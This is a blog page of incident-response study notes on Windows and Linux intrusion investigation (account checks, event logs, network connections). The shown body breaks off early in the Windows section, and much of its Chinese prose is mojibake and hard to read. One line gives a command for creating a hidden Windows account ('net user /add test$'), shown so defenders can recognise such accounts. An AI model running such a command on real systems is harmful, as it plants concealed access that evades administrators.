<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Safe: 11-åº”æ€¥å“åº”</title>
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" type="text/css" href="/static/font.css"/>
<link rel="stylesheet" type="text/css" href="/static/drollery.e825b870.css"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<header id="preamble" class="status">
<header class="{className}" data-astro-cid-3ef6ksr2>
  <div class=header-branding data-astro-cid-g2lrb5xm>
      <span class=header-text data-astro-cid-g2lrb5xm>
          <span class=dropcap data-astro-cid-g2lrb5xm aria-hidden=true>
              <span class=actual data-astro-cid-g2lrb5xm>J</span>
              <span class=rest data-astro-cid-g2lrb5xm>asper Hsu</span>
              <span class=period data-astro-cid-g2lrb5xm>.</span>
          </span>
          <span class=sr-only data-astro-cid-g2lrb5xm>Drollery</span>
      </span>
      <img alt="Medieval drollery of a knight on a horse" class=spring decoding=async height=250 loading=lazy src=/images/knight-horse.a96eee7d_Z1WCOYs.webp width=68 data-astro-cid-g2lrb5xm>
  </div>

  <nav data-astro-cid-pux6a34n>
      <span class=flower2 data-astro-cid-pux6a34n>M</span>
      <a href=/jcodelog.html class=nobracket data-astro-cid-pux6a34n>æŠ€æœ¯</a>
      <span class=flower2 data-astro-cid-pux6a34n>K</span>
      <a href=/reading/index.html class=nobracket data-astro-cid-pux6a34n>é˜…è¯»</a>
      <span class=flower2 data-astro-cid-pux6a34n>J</span>
      <a href=/lisp/jasper-emacs.html class=nobracket data-astro-cid-pux6a34n>æˆ‘çš„Emacsé…ç½®</a>
      <span class=flower2 data-astro-cid-pux6a34n>L</span>
      <a href=/link/index.html class=nobracket data-astro-cid-pux6a34n>å‹é“¾</a>
      <span class=flower2 data-astro-cid-pux6a34n>M</span>
      <a href=/about.html class=nobracket data-astro-cid-pux6a34n>å…³äº</a>
      <span class=flower2 data-astro-cid-pux6a34n>J</span>
  </nav>


  <div class="container" data-astro-cid-3ef6ksr2>
    <p class="info" data-astro-cid-3ef6ksr2>
              ğŸ† æ¬¢è¿æ¥åˆ°æœ¬ç«™ï¼š
              <a href="https://xuchangwei.com/">https://xuchangwei.com/</a>ã€‚
              <strong>å¸Œæœ›è¿™é‡Œæœ‰ä½ æ„Ÿå…´è¶£çš„å†…å®¹</strong>ã€‚
            </p>
  </div>
  <div id=borderArtWrapper class="tt1" data-astro-cid-5hce7sga data-turbo-permanent>
      <script>
          var man, shakeCount = 0, noSound = new Audio("/audio/effects/no.m4a"), screamSound = new Audio("/audio/effects/scream.m4a");
          function animateManShakeHandler() {
              man.removeEventListener("animationend", animateManShakeHandler, !1),
              shakeCount += 1,
              man.classList.remove("shakeMan")
          }
          function animateManFallHandler() {
              man.removeEventListener("animationend", animateManFallHandler, !1),
              man.classList.add("hide")
          }
          function animateMan() {
              man = man ?? document.getElementById("borderMan"),
              3 === shakeCount ? (man.classList.add("fallMan"),
              screamSound.play(),
              man.addEventListener("animationend", animateManFallHandler, !1)) : (man.classList.add("shakeMan"),
              noSound.play(),
              man.addEventListener("animationend", animateManShakeHandler, !1))
          }
      </script>
      <div class=borderArt data-astro-cid-5dda5nwp id=articleBorder>
          <img alt="flowery border with man falling" decoding=async height=620 loading=lazy src=/images/border-vines-no-man.b7d246cc_DRxSe.webp width=909 class=border data-astro-cid-5dda5nwp>
          <div class=fallWrapper data-astro-cid-5dda5nwp>
              <img alt="flowery border with man falling" decoding=async height=292 loading=lazy src=/images/man-no-vines.247a3187_Z2ioXNM.webp width=98 class=man data-astro-cid-5dda5nwp id=borderMan onclick=animateMan()>
          </div>
      </div>
  </div>
</header>
</header>
<main class="container" id="content" class="content">
<header>
<h1 class="title">Safe: 11-åº”æ€¥å“åº”</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#orga2d12ca">å…¥ä¾µæ’æŸ¥</a>
<ul>
<li><a href="#org0897cb5">Windowså…¥ä¾µæ’æŸ¥</a>
<ul>
<li><a href="#org0ab39b2">æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨</a></li>
<li><a href="#org90d31b3">æ£€æŸ¥å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹</a></li>
<li><a href="#org6829ec1">æ£€æŸ¥å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡</a></li>
</ul>
</li>
<li><a href="#org2e69e2b">Linuxå…¥ä¾µæ’æŸ¥</a>
<ul>
<li><a href="#orgbe47030">è´¦å·å®‰å…¨</a></li>
<li><a href="#org3737f85">å†å²å‘½ä»¤</a></li>
<li><a href="#orgea45f27">æ£€æŸ¥å¼‚å¸¸ç«¯å£</a></li>
<li><a href="#orgd7319db">æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹</a></li>
<li><a href="#org952dbb4">æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹</a></li>
<li><a href="#org618012c">æ£€æŸ¥å®šæ—¶ä»»åŠ¡</a></li>
<li><a href="#org2e559b0">æ£€æŸ¥æœåŠ¡</a></li>
<li><a href="#org0881656">æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶</a></li>
<li><a href="#org8f4e8fc">æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—</a></li>
<li><a href="#org9e8beba">å·¥å…·æŸ¥æ€</a>
<ul>
<li><a href="#org4db1df5">RootkitæŸ¥æ€</a></li>
<li><a href="#org072f7f5">ç—…æ¯’æŸ¥æ€</a></li>
<li><a href="#org6d30f3e">WebshellæŸ¥æ€</a></li>
</ul>
</li>
<li><a href="#org76245b2">å¸¸è§çš„WebShellæŸ¥æ€å·¥å…·</a></li>
<li><a href="#orgcf7a7b7">Dç›¾_WebæŸ¥æ€</a></li>
<li><a href="#org711faef">ç™¾åº¦ WEBDIR+</a></li>
<li><a href="#org810cca3">æ²³é©¬</a></li>
<li><a href="#org033e6c5">Web Shell Detector</a></li>
<li><a href="#orgf53e64c">CloudWalkerï¼ˆç‰§äº‘ï¼‰</a></li>
</ul>
</li>
<li><a href="#org4a398f8">å¦‚ä½•å‘ç°éšè—çš„WebShellåé—¨</a>
<ul>
<li><a href="#orgaa035a6">MD5æ ¡éªŒ</a></li>
<li><a href="#orgf5032d9">diff å‘½ä»¤</a></li>
<li><a href="#org4c34611">æ–‡ä»¶å¯¹æ¯”å·¥å…·</a></li>
</ul>
</li>
<li><a href="#org434bb0c">å‹’ç´¢ç—…æ¯’è‡ªæ•‘æŒ‡å—</a>
<ul>
<li><a href="#org7ed2d49">å‹’ç´¢ç—…æ¯’åŠ å¯†åŸç†</a></li>
<li><a href="#org3c51e72">å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“</a></li>
<li><a href="#orgfbd0e32">å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·é›†</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orgb1988fc">æ—¥å¿—åˆ†æ</a>
<ul>
<li><a href="#org216e8eb">Windowsæ—¥å¿—åˆ†æ</a>
<ul>
<li><a href="#org34a1560">Windowsäº‹ä»¶æ—¥å¿—ç®€ä»‹</a></li>
<li><a href="#org34f58c4">å®¡æ ¸ç­–ç•¥ä¸äº‹ä»¶æŸ¥çœ‹å™¨</a></li>
<li><a href="#orgdd547b9">äº‹ä»¶æ—¥å¿—åˆ†æ</a></li>
<li><a href="#orgfc1f9ed">æ—¥å¿—åˆ†æå·¥å…·</a>
<ul>
<li><a href="#orgdc6e219">Log Parser</a></li>
<li><a href="#orgd108e99">LogParser Lizard</a></li>
</ul>
</li>
<li><a href="#orgf48e25c">å……å†…å®¹</a></li>
</ul>
</li>
<li><a href="#org9ef8b7a">Linuxæ—¥å¿—åˆ†æ</a>
<ul>
<li><a href="#orga36ac1b">æ—¥å¿—ç®€ä»‹</a></li>
<li><a href="#org14b47e9">æ—¥å¿—åˆ†ææŠ€å·§</a>
<ul>
<li><a href="#org8dd22bd">å¸¸ç”¨çš„shellå‘½ä»¤</a></li>
<li><a href="#orgcaa8774">æ—¥å¿—åˆ†ææŠ€å·§</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org5028939">Webæ—¥å¿—åˆ†æ</a>
<ul>
<li><a href="#orgc0944ca">æ—¥å¿—åˆ†ææŠ€å·§</a></li>
<li><a href="#orgd36b7fa">æ—¥å¿—åˆ†ææ¡ˆä¾‹</a></li>
<li><a href="#org933782d">æ—¥å¿—ç»Ÿè®¡åˆ†ææŠ€å·§</a></li>
</ul>
</li>
<li><a href="#org6a021c3">Mysqlæ—¥å¿—åˆ†æ</a>
<ul>
<li><a href="#org33fec2e">Mysqlæš´åŠ›ç ´è§£æ—¥å¿—åˆ†æ</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orgd128d32">æƒé™ç»´æŒ</a>
<ul>
<li><a href="#org73e3e00">Windowsæƒé™ç»´æŒ-éšè—ç¯‡</a>
<ul>
<li><a href="#org77d0234">éšè—æ–‡ä»¶</a>
<ul>
<li><a href="#org45e019c">æ–¹æ³•1-åˆ©ç”¨æ–‡ä»¶å±æ€§</a></li>
<li><a href="#org547468d">æ–¹æ³•2-åˆ©ç”¨ADS(Alternate Data Streams)éšè—æ–‡ä»¶å†…å®¹</a></li>
</ul>
</li>
<li><a href="#orge91be9c">éšè—è´¦å·</a></li>
<li><a href="#org8dc1eb6">è¿›ç¨‹æ³¨å…¥</a></li>
</ul>
</li>
<li><a href="#org08d8035">Windowsæƒé™ç»´æŒ-åé—¨ç¯‡</a>
<ul>
<li><a href="#org3b62f55">ç²˜æ»é”®åé—¨</a></li>
<li><a href="#org72d0f67">Logon Scriptsåé—¨</a></li>
<li><a href="#org912ec54">æ˜ åƒåŠ«æŒ</a></li>
<li><a href="#org359e294">æ³¨å†Œè¡¨è‡ªå¯åŠ¨åé—¨</a></li>
<li><a href="#orgf8a2af6">è®¡åˆ’ä»»åŠ¡åé—¨</a></li>
<li><a href="#org995c2c1">æœåŠ¡è‡ªå¯åŠ¨åé—¨</a></li>
</ul>
</li>
<li><a href="#orgaa64fd8">Linuxæƒé™ç»´æŒ-éšè—ç¯‡</a>
<ul>
<li><a href="#orgef2794f">éšè—æ–‡ä»¶</a></li>
<li><a href="#org76af6c0">éšè—æ–‡ä»¶æ—¶é—´æˆ³</a></li>
<li><a href="#org965cf3d">éšè—æƒé™</a></li>
<li><a href="#org748f726">éšè—å†å²æ“ä½œå‘½ä»¤</a></li>
</ul>
</li>
<li><a href="#org0d6910a">Linuxæƒé™ç»´æŒ-åé—¨ç¯‡</a>
<ul>
<li><a href="#orgbc57ccb">ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç </a></li>
<li><a href="#org443e90e">SSHå…å¯†ç™»å½•</a></li>
</ul>
</li>
<li><a href="#org38230ba">Windowså‘½ä»¤è¡Œæ–‡ä»¶ä¸‹è½½æ–¹å¼æ±‡æ€»</a>
<ul>
<li><a href="#org8c5fa78">PowerShell</a></li>
<li><a href="#org378f754">Bitsadmin</a></li>
<li><a href="#org937d940">certutil</a></li>
<li><a href="#org5130b2b">msiexec</a></li>
<li><a href="#org621c101">mshta</a></li>
</ul>
</li>
<li><a href="#org7bd683a">æ¸—é€æµ‹è¯•æ¡†æ¶æƒé™ç»´æŒæŠ€æœ¯</a>
<ul>
<li><a href="#org1acd20d">Persistenceæ¨¡å—</a></li>
</ul>
</li>
<li><a href="#orgc675b61">å¸¸è§Webshellç®¡ç†å·¥å…·</a>
<ul>
<li><a href="#orgbc61aa0">èœåˆ€</a></li>
<li><a href="#org153bab9">èšå‰‘</a></li>
<li><a href="#org46f5ab3">å†°è</a></li>
<li><a href="#org3210d73">å“¥æ–¯æ‹‰</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org941804b">Windows å®æˆ˜</a>
<ul>
<li><a href="#org9351792">FTPæš´åŠ›ç ´è§£</a></li>
<li><a href="#org6922ddf">å‹’ç´¢ç—…æ¯’</a></li>
<li><a href="#orge3e21e4">æŒ–çŸ¿ç—…æ¯’</a></li>
</ul>
</li>
<li><a href="#org0b7dc13">Linux å®æˆ˜</a>
<ul>
<li><a href="#orgc418c0a">SSHæš´åŠ›ç ´è§£</a></li>
<li><a href="#org42bab92">DDOSç—…æ¯’</a></li>
</ul>
</li>
<li><a href="#org34e9e61">Web å®æˆ˜</a>
<ul>
<li><a href="#org59224df">ç½‘ç«™è¢«æ¤å…¥Webshell</a></li>
<li><a href="#orge7c19cb">æ‰¹é‡æŒ‚é»‘é¡µ</a></li>
<li><a href="#org39f73ef">æ–°é—»æºç½‘ç«™åŠ«æŒ</a></li>
<li><a href="#org5e38e65">æœç´¢å¼•æ“åŠ«æŒ</a></li>
<li><a href="#orga8d7185">ç½‘ç«™é¦–é¡µè¢«ç¯¡æ”¹</a></li>
<li><a href="#org155134d">ç®¡ç†å‘˜è´¦å·è¢«ç¯¡æ”¹</a></li>
<li><a href="#org3a2c983">ç¼–è¾‘å™¨å…¥ä¾µäº‹ä»¶</a></li>
</ul>
</li>
<li><a href="#org8fa7a40">æ’°å†™åº”æ€¥å“åº”æŠ¥å‘Š</a></li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../../index.html">Safe</a><br></li>
</ul>
<section id="outline-container-orga2d12ca" class="outline-2">
<h2 id="orga2d12ca">å…¥ä¾µæ’æŸ¥</h2>
<div class="outline-text-2" id="text-orga2d12ca">
<p>
ä¸»è¦å†…å®¹ï¼š<br>
</p>
<ul class="org-ul">
<li>Windows å…¥ä¾µæ’æŸ¥<br></li>
<li>Linux å…¥ä¾µæ’æŸ¥<br></li>
<li>å¸¸ç”¨çš„ webshell æŸ¥æ€å·¥å…·<br></li>
<li>å¦‚ä½•å‘ç°éšè—çš„ webshell åé—¨<br></li>
<li>å‹’ç´¢ç—…æ¯’è‡ªæ•‘æŒ‡å—<br></li>
</ul>

<p>
æ”¶åˆ°åº”æ€¥å“åº”é€šçŸ¥ï¼Œé¦–å…ˆç¡®å®šæ˜¯å¦æ˜¯å®‰å…¨äº‹ä»¶ã€‚<br>
</p>

<p>
å½“ä¼ä¸šå‘ç”Ÿé»‘å®¢å…¥ä¾µã€ç³»ç»Ÿå´©æºƒæˆ–å…¶å®ƒå½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œçš„å®‰å…¨äº‹ä»¶æ—¶ï¼Œæ€¥éœ€ç¬¬ä¸€æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä½¿ä¼ä¸šçš„ç½‘ç»œä¿¡æ¯ç³»ç»Ÿåœ¨æœ€çŸ­æ—¶é—´å†…æ¢å¤æ­£å¸¸å·¥ä½œï¼Œè¿›ä¸€æ­¥æŸ¥æ‰¾å…¥ä¾µæ¥æºï¼Œè¿˜åŸå…¥ä¾µäº‹æ•…è¿‡ç¨‹ï¼ŒåŒæ—¶ç»™å‡ºè§£å†³æ–¹æ¡ˆä¸é˜²èŒƒæªæ–½ï¼Œä¸ºä¼ä¸šæŒ½å›æˆ–å‡å°‘ç»æµæŸå¤±ã€‚<br>
</p>

<p>
å¸¸è§çš„åº”æ€¥å“åº”äº‹ä»¶åˆ†ç±»ï¼š<br>
Webå…¥ä¾µï¼šç½‘é¡µæŒ‚é©¬ã€ä¸»é¡µç¯¡æ”¹ã€Webshell<br>
ç³»ç»Ÿå…¥ä¾µï¼šç—…æ¯’æœ¨é©¬ã€å‹’ç´¢è½¯ä»¶ã€è¿œæ§åé—¨<br>
ç½‘ç»œæ”»å‡»ï¼šDDOS æ”»å‡»ã€DNS åŠ«æŒã€ARP æ¬ºéª—<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">
Web&#20837;&#20405;&#65306;
- &#32593;&#39029;&#25346;&#39532;: &#32593;&#39029;&#19978;&#34987;&#25346;&#20102;&#19968;&#20123;&#26408;&#39532;
- &#20027;&#39029;&#31713;&#25913;&#65306;&#20027;&#35201;&#29992;&#20110;&#19968;&#20123;&#31038;&#20250;&#23618;&#38754;&#25110;&#32773;&#22269;&#23478;&#23618;&#38754;&#30340;&#25915;&#20987;&#12290;&#27604;&#22914;&#37325;&#35201;&#20250;&#35758;&#26399;&#38388;&#25915;&#20987;&#19968;&#20123;&#25919;&#24220;&#32593;&#31449;&#65292;&#22312;&#32593;&#31449;&#21457;&#24067;&#21453;&#21160;&#35328;&#35770;&#12290;&#38450;&#25252;&#19978;&#20113;&#30417;&#25511;&#65292;&#36890;&#36807;&#33050;&#26412;&#25235;&#21462;&#32593;&#31449;&#25152;&#26377;&#38142;&#25509;&#20998;&#26512;&#65292;&#32593;&#31449;&#21457;&#29983;&#24322;&#24120;&#21464;&#21270;&#26102;&#36816;&#32500;&#20154;&#21592;&#23601;&#20250;&#25910;&#21040;&#30701;&#20449;&#36890;&#30693;
- Webshell&#65306;

&#31995;&#32479;&#20837;&#20405;&#65306;
- &#30149;&#27602;&#26408;&#39532;&#65306;
- &#21202;&#32034;&#36719;&#20214;&#65306;
- &#36828;&#25511;&#21518;&#38376;&#65306;
&#31995;&#32479;&#20837;&#20405;&#20027;&#35201;&#20511;&#21161;&#19968;&#20123;&#33258;&#21160;&#21270;&#30340;&#24037;&#20855;&#20998;&#26512;&#30456;&#20851;&#30340;&#36827;&#31243;&#65292;&#26597;&#25214;&#20986;&#24694;&#24847;&#25991;&#20214;&#28982;&#21518;&#36827;&#34892;&#21024;&#38500;&#12290;

&#32593;&#32476;&#25915;&#20987;&#65306;
- DDOS &#25915;&#20987;&#65306; &#38450;&#24481;&#65306;&#37096;&#32626;&#27969;&#37327;&#28165;&#27927;&#35774;&#22791;&#12289;CDN&#20570;&#27969;&#37327;&#20998;&#27969;
- DNS &#21163;&#25345;&#65306;&#25915;&#20987;&#32773;&#21033;&#29992;&#25915;&#20987;&#25163;&#27573;&#31713;&#25913;&#20102;&#26576;&#20010;&#22495;&#21517;&#30340;&#35299;&#26512;&#32467;&#26524;&#65292;&#20351;&#24471;&#25351;&#21521;&#35813;&#22495;&#21517;&#30340;ip&#21464;&#25104;&#20063;&#21478;&#19968;&#20010;ip&#65292;&#23548;&#33268;&#30456;&#24212;&#32593;&#31449;&#30340;&#35775;&#38382;&#34987;&#21163;&#25345;&#21040;&#21478;&#19968;&#20010;&#20551;&#20882;&#30340;&#31449;&#28857;&#65292;&#20174;&#32780;&#23454;&#29616;&#38750;&#27861;&#31363;&#21462;&#29992;&#25143;&#20449;&#24687;&#12289;&#30772;&#22351;&#32593;&#32476;&#26381;&#21153;&#30340;&#30446;&#30340;
- ARP &#27450;&#39575;&#65306;arp&#26159;&#19968;&#20010;&#22320;&#22336;&#35299;&#26512;&#21327;&#35758;&#65292;&#22312;&#23616;&#22495;&#32593;&#37324;&#20027;&#26426;&#38388;&#36890;&#20449;&#21457;&#36865;arp&#24212;&#31572;&#20449;&#24687;&#65292;&#26412;&#22320;&#20027;&#26426;&#25910;&#21040;&#24212;&#31572;&#20449;&#24687;&#21518;&#19981;&#20250;&#39564;&#35777;&#30495;&#23454;&#24615;&#65292;&#20250;&#25226;&#20449;&#24687;&#35760;&#24405;&#22312;&#33258;&#24049;&#30340;&#26144;&#23556;&#34920;&#37324;&#65292;&#36825;&#26679;&#23601;&#20250;&#26377;&#19968;&#20010;ip&#21644;mac&#23545;&#24212;&#20851;&#31995;&#12290;&#25915;&#20987;&#32773;&#21033;&#29992;&#36825;&#31181;&#26426;&#21046;&#21457;&#36865;&#19968;&#20123;&#20266;&#36896;&#30340;arp&#21253;&#65292;&#31713;&#25913;&#20102;&#30446;&#26631;&#20027;&#26426;&#30340;arp&#32531;&#23384;&#34920;&#65292;&#36896;&#25104;&#20027;&#26426;&#38388;&#26080;&#27861;&#27491;&#24120;&#36890;&#20449;&#12290;
&#32593;&#32476;&#25915;&#20987;&#22312;&#22788;&#29702;&#19978;&#30456;&#23545;&#20110;web&#20837;&#20405;&#21644;&#31995;&#32479;&#20837;&#20405;&#26469;&#35828;&#22788;&#29702;&#38590;&#24230;&#36739;&#39640;&#12290;&#22240;&#20026;&#20182;&#20204;&#19981;&#23646;&#20110;&#24120;&#35268;&#30340;&#25915;&#20987;&#65292;&#22914;&#26524;&#25915;&#20987;&#32773;&#30495;&#30340;&#29992;&#36825;&#31181;&#26041;&#27861;&#26469;&#25171;&#20320;&#65292;&#23427;&#32943;&#23450;&#26159;&#19968;&#31181;&#20260;&#25932;1000&#33258;&#25439;800&#30340;&#20570;&#27861;&#12290;
</pre>
</div>
</div>
<div id="outline-container-org0897cb5" class="outline-3">
<h3 id="org0897cb5">Windowså…¥ä¾µæ’æŸ¥</h3>
<div class="outline-text-3" id="text-org0897cb5">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šWindows Server 2008</b><br>
</p>

<p>
é’ˆå¯¹å¸¸è§çš„æ”»å‡»äº‹ä»¶ï¼Œç»“åˆå·¥ä½œä¸­åº”æ€¥å“åº”äº‹ä»¶åˆ†æå’Œè§£å†³çš„æ–¹æ³•ï¼Œå¸¸è§ Windows æœåŠ¡å™¨å…¥ä¾µæ’æŸ¥çš„æ€è·¯å¦‚ä¸‹ã€‚<br>
</p>
</div>
<div id="outline-container-org0ab39b2" class="outline-4">
<h4 id="org0ab39b2">æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨</h4>
<div class="outline-text-4" id="text-org0ab39b2">
<p>
<b>1ã€æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦æœ‰å¼±å£ä»¤ï¼Œè¿œç¨‹ç®¡ç†ç«¯å£æ˜¯å¦å¯¹å…¬ç½‘å¼€æ”¾</b><br>
</p>

<p>
æ£€æŸ¥æ–¹æ³•ï¼šæ®å®é™…æƒ…å†µå’¨è¯¢ç›¸å…³æœåŠ¡å™¨ç®¡ç†å‘˜ã€‚<br>
</p>

<p>
<b>2ã€æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨å¯ç–‘è´¦å·ã€æ–°å¢è´¦å·</b><br>
</p>

<p>
æ£€æŸ¥æ–¹æ³•ï¼šæ‰“å¼€ cmd çª—å£ï¼Œè¾“å…¥ lusrmgr.msc å‘½ä»¤ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ–°å¢/å¯ç–‘çš„è´¦å·ï¼Œå¦‚æœ‰ç®¡ç†å‘˜ç¾¤ç»„çš„ï¼ˆAdministratorsï¼‰é‡Œçš„æ–°å¢è´¦æˆ·ï¼Œè¯·ç«‹å³ç¦ç”¨æˆ–åˆ é™¤ã€‚<br>
åç§°åé¢æœ‰$ç¬¦å·æ˜¯éšè—è´¦å·ã€‚ä½¿ç”¨ net user å‘½ä»¤æ˜¯çœ‹ä¸åˆ°éšè—è´¦å·çš„ã€‚<br>
</p>


<figure id="org779cd23">
<img src="./images/img_20230814_112848.png" alt="img_20230814_112848.png" width="60%"><br>

</figure>

<p>
å‘ç°å¯ç–‘testè´¦å·ï¼Œåˆ é™¤testè´¦å·<br>
</p>


<figure id="org55decdc">
<img src="./images/img_20230814_112908.png" alt="img_20230814_112908.png" width="60%"><br>

</figure>

<p>
<b>3ã€æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨éšè—è´¦å·ã€å…‹éš†è´¦å·</b><br>
</p>

<p>
æ£€æŸ¥æ–¹æ³•ï¼šä½¿ç”¨Dç›¾_webæŸ¥æ€å·¥å…·ï¼Œé›†æˆäº†å¯¹éšè—ã€å…‹éš†è´¦å·æ£€æµ‹çš„åŠŸèƒ½<br>
</p>



<figure id="org619b741">
<img src="./images/img_20230814_113003.png" alt="img_20230814_113003.png" width="60%"><br>

</figure>

<div class="org-src-container">
<pre class="src src-sh">net user /add test$ <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22686;&#21152;&#38544;&#34255;&#36134;&#21495;&#21629;&#20196;</span>
</pre>
</div>

<p>
<b>4ã€ç»“åˆæ—¥å¿—ï¼ŒæŸ¥çœ‹ç®¡ç†å‘˜ç™»å½•æ—¶é—´ã€ç”¨æˆ·åæ˜¯å¦å­˜åœ¨å¼‚å¸¸</b><br>
</p>

<p>
æ£€æŸ¥æ–¹æ³•ï¼š<br>
aã€Win+R æ‰“å¼€è¿è¡Œï¼Œè¾“å…¥"eventvwr.msc"ï¼Œå›è½¦è¿è¡Œï¼Œæ‰“å¼€â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ã€‚<br>
</p>


<figure id="orgfea7720">
<img src="./images/img_20230814_113132.png" alt="img_20230814_113132.png" width="60%"><br>

</figure>

<p>
bã€å¯¼å‡º Windows æ—¥å¿— &#x2013; å®‰å…¨ï¼Œåˆ©ç”¨å¾®è½¯å®˜æ–¹å·¥å…· <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> è¿›è¡Œåˆ†æã€‚<br>
</p>


<figure id="org86b5247">
<img src="./images/img_20230814_113237.png" alt="img_20230814_113237.png" width="60%"><br>

</figure>

<p>
å·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br>
</p>

<p>
ç¤ºä¾‹ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">LogParser.exe -i:evt <span style="color: #8b2252;">"select top 100 * from D:\&#31163;&#32447;&#24037;&#20855;\Security.evtx "</span> - o:DATAGRID
LogParser.exe -i:&#36755;&#20837;&#25991;&#20214;&#30340;&#26684;&#24335; SQL&#35821;&#21477; -o&#65306;&#36755;&#20986;&#25991;&#20214;&#30340;&#26684;&#24335;

&#21442;&#25968;&#20351;&#29992;
-i:&lt;&#36755;&#20837;&#28304;&gt;
&#20013;&#38388;&#37096;&#20998;&#65292;sql&#35821;&#21477;
-o:&lt;&#36755;&#20986;&#26684;&#24335;&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-org90d31b3" class="outline-4">
<h4 id="org90d31b3">æ£€æŸ¥å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹</h4>
<div class="outline-text-4" id="text-org90d31b3">
<p>
<b>1ã€æ£€æŸ¥ç½‘ç»œè¿æ¥æƒ…å†µï¼Œæ˜¯å¦æœ‰è¿œç¨‹è¿æ¥ã€å¯ç–‘è¿æ¥</b><br>
</p>

<p>
æ£€æŸ¥æ–¹æ³•ï¼š<br>
aã€ä½¿ç”¨ netstat -ano å‘½ä»¤æŸ¥çœ‹ç›®å‰çš„ç½‘ç»œè¿æ¥ï¼Œå®šä½å¯ç–‘çš„ ESTABLISHED<br>
</p>

<p>
ESTABLISHEDï¼šå®Œæˆè¿æ¥å¹¶æ­£åœ¨è¿›è¡Œæ•°æ®é€šä¿¡çš„çŠ¶æ€ã€‚<br>
LISTENINGï¼šè¡¨ç¤ºå¤„äºä¾¦å¬çŠ¶æ€ï¼Œå°±æ˜¯è¯´è¯¥ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç­‰å¾…è¿æ¥ï¼Œä½†è¿˜æ²¡æœ‰è¢«è¿æ¥ã€‚<br>
CLOSE_WAITï¼šå¯¹æ–¹ä¸»åŠ¨å…³é—­è¿æ¥æˆ–è€…ç½‘ç»œå¼‚å¸¸å¯¼è‡´è¿æ¥ä¸­æ–­ã€‚<br>
TIME_WAITï¼šæˆ‘æ–¹ä¸»åŠ¨è°ƒç”¨close()æ–­å¼€è¿æ¥ï¼Œæ”¶åˆ°å¯¹æ–¹ç¡®è®¤åçŠ¶æ€å˜ä¸ºTIME_WAITã€‚<br>
</p>

<p>
bã€æ ¹æ® netstat å‘½ä»¤å®šä½å‡ºçš„ PID ç¼–å·ï¼Œå†é€šè¿‡ tasklist å‘½ä»¤è¿›è¡Œè¿›ç¨‹å®šä½<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">tasklist | findstr <span style="color: #8b2252;">"PID&#32534;&#21495;"</span>

netstat -ano | find <span style="color: #8b2252;">"ESTABLISHED"</span>
tasklist | findstr <span style="color: #8b2252;">"8284"</span>
</pre>
</div>


<figure id="orgf728afe">
<img src="./images/img_20230814_134805.png" alt="img_20230814_134805.png" width="60%"><br>

</figure>


<p>
å¯ä»¥è¿›ä¸€æ­¥å»ä»»åŠ¡ç®¡ç†å™¨çš„æœåŠ¡é€‰é¡¹ä¸­ç¡®è®¤ï¼ˆä¸ä¸€å®šèƒ½æ‰¾åˆ°ï¼Œå› ä¸ºwebshellæ˜¯ä¾èµ–webæœåŠ¡è¿è¡Œçš„ï¼Œèƒ½æ‰¾åˆ°webæœåŠ¡ï¼Œwebshellä¸æ˜¯ä¸€ä¸ªå•ç‹¬è¿è¡Œçš„æœåŠ¡ï¼‰<br>
</p>
<ul class="org-ul">
<li>çŠ¶æ€æ é¼ æ ‡å³é”®é€‰æ‹©ä»»åŠ¡ç®¡ç†å™¨<br></li>
</ul>


<figure id="org07b700b">
